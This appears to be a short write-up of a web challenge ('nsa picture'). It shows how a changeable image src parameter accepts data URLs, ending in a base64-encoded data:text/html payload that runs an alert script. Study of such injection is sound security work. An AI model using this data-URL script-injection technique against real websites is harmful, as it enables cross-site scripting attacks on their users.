nsa picture. change src in url and you will get everywhere you want on this website.
in order to use whitespaces and another symbols in url, we need to make them base64 or just use % for whitespaces symbols. site to encode/decode base64 https://www.base64encode.org/

i used data urls.
syntax - data:[<media-type>][;base64],<data>

data:,Hello%2C%20World%21 to check if it will work.
and base64 version:
data:text/plane;base64,SGVsbG8sIFdvcmxkIQ==

now we can put there script and use text/html MIME to show alert:

<script>alert("hello there");</script>

but there are no '<' and '>' to encode them with '%' sign (links to doc about data urls https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Schemes/data), therefore we have to make this string base64:

PHNjcmlwdD5hbGVydCgiaGVsbG8gdGhlcmUiKTs8L3NjcmlwdD4=

and the whole version:

data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGVsbG8gdGhlcmUiKTs8L3NjcmlwdD4=
